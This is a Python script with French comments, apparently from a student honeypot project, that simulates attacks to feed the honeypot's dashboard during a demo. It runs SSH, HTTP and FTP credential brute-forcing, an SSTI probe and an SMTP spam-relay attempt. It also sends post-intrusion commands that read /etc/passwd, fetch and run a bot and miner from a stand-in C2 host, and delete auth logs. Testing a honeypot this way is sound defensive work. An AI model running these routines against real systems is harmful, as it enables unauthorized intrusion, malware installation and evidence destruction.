#!/usr/bin/env python3
# ============================================================
#  demo_attack.py - Simulateur d'attaques pour la soutenance
#  Projet Annuel ESGI - Honeypot Multi-Services
#
#  But : alimenter le honeypot en temps reel pendant la demo,
#  pour montrer au jury la capture des credentials, commandes
#  et payloads sur le dashboard.
#
#  CE SCRIPT N'ATTAQUE QUE VOTRE PROPRE HONEYPOT (localhost par
#  defaut). Ne jamais l'utiliser contre un systeme tiers.
#
#  Usage :
#    python3 demo_attack.py                 # cible localhost, ports test
#    python3 demo_attack.py --host 1.2.3.4  # cible un VPS (ports reels)
#    python3 demo_attack.py --prod          # ports reels sur localhost
#    python3 demo_attack.py --fast          # rafale rapide (peu de pauses)
# ============================================================

import socket
import time
import argparse
import random
import sys

# ── Dictionnaire d'attaque realiste (couples vus dans la vraie vie)
CREDENTIALS = [
    ("root", "123456"), ("root", "root"), ("root", "toor"),
    ("root", "admin"), ("root", "password"), ("root", "1234"),
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("user", "user"), ("ubuntu", "ubuntu"), ("pi", "raspberry"),
    ("test", "test"), ("oracle", "oracle"), ("postgres", "postgres"),
    ("git", "git"), ("ftp", "ftp"), ("guest", "guest"),
]

# ── Commandes typiques post-intrusion (ce qu'un bot tape apres connexion SSH)
POST_INTRUSION_CMDS = [
    "uname -a",
    "whoami",
    "cat /etc/passwd",
    "cat /proc/cpuinfo",
    "wget http://malware-c2.example/bot.sh",
    "curl -O http://malware-c2.example/miner",
    "chmod +x bot.sh",
    "./bot.sh",
    "history -c",
    "rm -rf /var/log/auth.log",
]

# ── User-agents de scanners reels
USER_AGENTS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "python-requests/2.31.0",
    "curl/7.88.1",
    "Hello, World",  # signature du botnet Mozi
    "Mozilla/5.0 zgrab/0.x",
]

C = {"g": "\033[92m", "c": "\033[96m", "y": "\033[93m", "r": "\033[91m", "n": "\033[0m", "b": "\033[1m"}

def banner(host, ports):
    print(f"""{C['c']}{C['b']}
============================================================
  SIMULATEUR D'ATTAQUES - Demonstration honeypot
============================================================{C['n']}
  Cible      : {host}
  Ports      : SSH:{ports['ssh']} HTTP:{ports['http']} FTP:{ports['ftp']} SMTP:{ports['smtp']}
  {C['y']}Rappel : ce script n'attaque QUE votre propre honeypot.{C['n']}
""")

def log(service, msg, color="n"):
    ts = time.strftime("%H:%M:%S")
    print(f"  {C[color]}[{ts}] [{service}]{C['n']} {msg}")

def pause(fast, base=0.8):
    time.sleep(0.1 if fast else base + random.uniform(0, 0.6))

# ──────────────────────────────────────────────
#  Attaque SSH : brute-force + commandes
# ──────────────────────────────────────────────
def attack_ssh(host, port, fast):
    log("SSH", f"{C['b']}Demarrage brute-force SSH (dictionnaire de {len(CREDENTIALS)} couples){C['n']}", "c")
    try:
        import paramiko
        paramiko.util.log_to_file("/dev/null")
    except ImportError:
        log("SSH", "paramiko absent (pip install paramiko) - section SSH ignoree", "r")
        return

    success_creds = None
    for user, pwd in CREDENTIALS:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=pwd,
                           timeout=5, allow_agent=False, look_for_keys=False,
                           banner_timeout=5, auth_timeout=5)
            log("SSH", f"tentative {C['y']}{user}:{pwd}{C['n']} -> {C['g']}acceptee{C['n']}", "g")
            if success_creds is None:
                success_creds = (user, pwd, client)
            else:
                client.close()
        except paramiko.AuthenticationException:
            log("SSH", f"tentative {user}:{pwd} -> refusee")
            client.close()
        except Exception as e:
            log("SSH", f"tentative {user}:{pwd} -> erreur ({type(e).__name__})", "r")
            try: client.close()
            except Exception: pass
        pause(fast, 0.4)

    # Une fois "connecte", on tape des commandes post-intrusion
    if success_creds:
        user, pwd, client = success_creds
        log("SSH", f"{C['b']}Session ouverte avec {user}:{pwd} - execution de commandes{C['n']}", "c")
        try:
            chan = client.invoke_shell()
            time.sleep(1)
            for cmd in POST_INTRUSION_CMDS:
                chan.send(cmd + "\n")
                log("SSH", f"$ {C['y']}{cmd}{C['n']}")
                pause(fast, 0.6)
                time.sleep(0.3)
            chan.close()
        except Exception as e:
            log("SSH", f"erreur shell : {e}", "r")
        finally:
            client.close()

# ──────────────────────────────────────────────
#  Attaque HTTP : scan de paths + brute-force login + payloads
# ──────────────────────────────────────────────
def attack_http(host, port, fast):
    log("HTTP", f"{C['b']}Scan de chemins + brute-force formulaire de login{C['n']}", "c")
    try:
        import urllib.request, urllib.parse, urllib.error
    except ImportError:
        return

    # Scan de paths classiques
    paths = ["/admin", "/wp-admin", "/phpmyadmin", "/.env", "/config.php", "/administrator"]
    for p in paths:
        try:
            req = urllib.request.Request(f"http://{host}:{port}{p}",
                                         headers={"User-Agent": random.choice(USER_AGENTS)})
            urllib.request.urlopen(req, timeout=5)
            log("HTTP", f"GET {p}")
        except Exception:
            log("HTTP", f"GET {p}")
        pause(fast, 0.3)

    # Brute-force du formulaire de login
    for user, pwd in CREDENTIALS[:8]:
        try:
            data = urllib.parse.urlencode({"username": user, "password": pwd}).encode()
            req = urllib.request.Request(f"http://{host}:{port}/login", data=data,
                                         headers={"User-Agent": random.choice(USER_AGENTS)})
            urllib.request.urlopen(req, timeout=5)
            log("HTTP", f"POST /login {C['y']}{user}:{pwd}{C['n']}")
        except Exception:
            log("HTTP", f"POST /login {user}:{pwd}")
        pause(fast, 0.4)

    # Tentative d'injection (sera capturee ET neutralisee par le honeypot)
    try:
        data = urllib.parse.urlencode({"username": "{{7*7}}", "password": "x"}).encode()
        req = urllib.request.Request(f"http://{host}:{port}/login", data=data)
        urllib.request.urlopen(req, timeout=5)
        log("HTTP", f"POST /login {C['r']}payload SSTI {{{{7*7}}}}{C['n']} (capture, non execute)")
    except Exception:
        pass

# ──────────────────────────────────────────────
#  Attaque FTP : brute-force basique
# ──────────────────────────────────────────────
def attack_ftp(host, port, fast):
    log("FTP", f"{C['b']}Brute-force FTP + tentative de listing{C['n']}", "c")
    from ftplib import FTP
    for user, pwd in CREDENTIALS[:6]:
        try:
            ftp = FTP()
            ftp.connect(host, port, timeout=5)
            ftp.login(user, pwd)
            log("FTP", f"login {C['y']}{user}:{pwd}{C['n']} -> {C['g']}accepte{C['n']}", "g")
            try:
                files = ftp.nlst()
                log("FTP", f"listing : {', '.join(files[:5])}")
            except Exception:
                pass
            ftp.quit()
        except Exception as e:
            log("FTP", f"login {user}:{pwd} -> {type(e).__name__}")
        pause(fast, 0.4)

# ──────────────────────────────────────────────
#  Attaque SMTP : tentative de relay
# ──────────────────────────────────────────────
def attack_smtp(host, port, fast):
    log("SMTP", f"{C['b']}Tentative de relay de spam{C['n']}", "c")
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.settimeout(5)
        s.recv(1024)  # banniere

        def send_cmd(cmd, label=None):
            s.sendall(cmd)
            try:
                s.recv(1024)
            except socket.timeout:
                pass
            log("SMTP", (label or cmd.decode(errors="ignore").strip())[:55])
            pause(fast, 0.4)

        send_cmd(b"EHLO attacker.example\r\n")
        send_cmd(b"MAIL FROM:<spammer@evil.example>\r\n")
        send_cmd(b"RCPT TO:<victim@target.example>\r\n")
        # Phase DATA : on envoie l'entete DATA, puis le corps, puis le point final
        s.sendall(b"DATA\r\n")
        try: s.recv(1024)
        except socket.timeout: pass
        log("SMTP", "DATA")
        pause(fast, 0.3)
        body = (b"Subject: You won a prize\r\n"
                b"From: spammer@evil.example\r\n\r\n"
                b"Click here to claim: http://phish.example\r\n"
                b".\r\n")
        s.sendall(body)
        try: s.recv(1024)
        except socket.timeout: pass
        log("SMTP", f"{C['y']}corps du mail envoye (relay tente){C['n']}")
        s.sendall(b"QUIT\r\n")
        s.close()
    except Exception as e:
        log("SMTP", f"erreur : {type(e).__name__}", "r")

# ──────────────────────────────────────────────
#  Main
# ──────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="Simulateur d'attaques pour demo honeypot")
    ap.add_argument("--host", default="127.0.0.1", help="Cible (defaut: localhost)")
    ap.add_argument("--prod", action="store_true", help="Ports reels (22/80/21/25)")
    ap.add_argument("--fast", action="store_true", help="Rafale rapide, peu de pauses")
    ap.add_argument("--only", choices=["ssh", "http", "ftp", "smtp"], help="Un seul service")
    args = ap.parse_args()

    if args.prod or args.host != "127.0.0.1":
        ports = {"ssh": 22, "http": 80, "ftp": 21, "smtp": 25}
    else:
        ports = {"ssh": 2222, "http": 8080, "ftp": 2121, "smtp": 2525}

    banner(args.host, ports)
    print(f"  {C['g']}Lancez le dashboard en parallele pour voir la capture en direct.{C['n']}\n")
    time.sleep(1)

    services = {
        "ssh":  lambda: attack_ssh(args.host, ports["ssh"], args.fast),
        "http": lambda: attack_http(args.host, ports["http"], args.fast),
        "ftp":  lambda: attack_ftp(args.host, ports["ftp"], args.fast),
        "smtp": lambda: attack_smtp(args.host, ports["smtp"], args.fast),
    }

    if args.only:
        services[args.only]()
    else:
        for name in ["ssh", "http", "ftp", "smtp"]:
            services[name]()
            print()
            pause(args.fast, 1.0)

    print(f"\n  {C['g']}{C['b']}Demonstration terminee. Consultez le dashboard.{C['n']}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {C['y']}Interrompu.{C['n']}")
        sys.exit(0)
